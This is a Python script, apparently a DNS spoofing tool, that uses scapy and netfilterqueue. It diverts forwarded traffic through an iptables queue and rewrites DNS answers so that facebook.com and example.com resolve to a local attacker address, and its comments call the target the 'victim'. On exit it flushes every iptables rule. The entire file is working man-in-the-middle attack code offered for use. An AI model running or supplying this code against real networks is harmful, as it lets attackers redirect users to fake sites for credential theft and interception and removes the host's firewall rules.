from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue
import os
import logging as log
import sys

# callback function
def spoofing(packet):
    # convert netfilterqueue to scapy
    scapyPacket = IP(packet.get_payload())
    # If packet has DNSRR modified the packet using the modifyfunction
    if scapyPacket.haslayer(DNSRR):
        # print before and after of modified packet
        print('[Original]:{}'.format(scapyPacket.summary()))
        try:
            scapyPacket = modifyPacket(scapyPacket)
        except IndexError as error:
            log.error(error)
        print('[Modified]:{}'.format(scapyPacket.summary()))
        # set the modifed scapy packet payload to the netfilterqueue packet
        packet.set_payload(bytes(scapyPacket))
    # accept and ready to send to the victim
    packet.accept()

# Declare dns dictionay and queue number for iptable
dnsmap = {b"facebook.com": "192.168.1.107",
          b"www.facebook.com":"192.168.1.107",
          b"example.com": "192.168.1.107"}
# set queue number
queue_no = 1

# modify the packet whic
def modifyPacket(packet):
    # get the domain name
    queue_name = packet[DNSQR].qname
    # if the domain name is the same as in our dictionary
    if queue_name in dnsmap:
        # create the DNS packet answer which
        # the domain name will map with outdict
        packet[DNS].an = DNSRR(rrname = queue_name,
                               rdata=dnsmap[queue_name])
        # the answer count in DNS data = 1
        packet[DNS].ancount = 1
        # delete packet len and checksum after IP spoofing (autocalcualte new)
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
    # if the domain names don't match
    else:
        print('[No Modification] , qname = {}'.format(queue_name))
        # return packet
        return packet
    return packet

# main function
def main():
    # try to bind the queue number with callback function
    try:
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(queue_no))
        
        queue = NetfilterQueue()
        queue.bind(queue_no, spoofing)
        queue.run()
    # CTRL+C to exit, and flush iptable
    except KeyboardInterrupt:
        os.system("iptables --flush")
        print("Flushed")
        sys.exit()

if __name__ == "__main__":
    main()